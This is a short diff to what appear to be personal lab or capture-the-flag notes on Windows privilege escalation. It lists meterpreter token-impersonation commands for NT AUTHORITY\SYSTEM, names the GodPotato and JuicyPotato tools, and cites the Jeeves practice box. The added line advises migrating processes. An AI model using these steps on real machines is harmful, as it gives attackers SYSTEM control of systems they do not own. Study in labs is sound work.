@@ -329,6 +329,7 @@ in the meterpreter shell type
 -     load incognito
 -     list_tokens -u
 -     impersonate_token "NT AUTHORITY\SYSTEM"
+sometimes you need to migrate to another process to get the NT AUTHORITY\SYSTEM
 use godpotato
 check Jeeves box FYR
 1- use juicy potato by transferring the file to the target machine (AV is off)
